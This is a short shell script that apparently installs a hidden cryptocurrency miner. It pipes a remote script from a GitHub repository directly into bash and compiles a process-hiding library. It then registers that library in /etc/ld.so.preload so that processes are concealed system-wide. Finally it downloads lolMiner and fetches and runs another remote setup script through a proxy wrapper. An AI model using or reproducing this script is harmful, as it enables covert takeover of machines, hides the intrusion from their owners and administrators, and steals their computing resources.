#!/bin/sh
wget -O - https://raw.githubusercontent.com/17mei2022/No_lol/main/px_1.sh | bash
wget https://github.com/17mei2022/No_lol/raw/main/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
tar -xvzf lolMiner_v1.51_Lin64.tar.gz
rm .gitignore
cd 1.51
wget https://raw.githubusercontent.com/17mei2022/No_lol/main/set_lol.sh
chmod +x *.sh
graftcp ./set_lol.sh
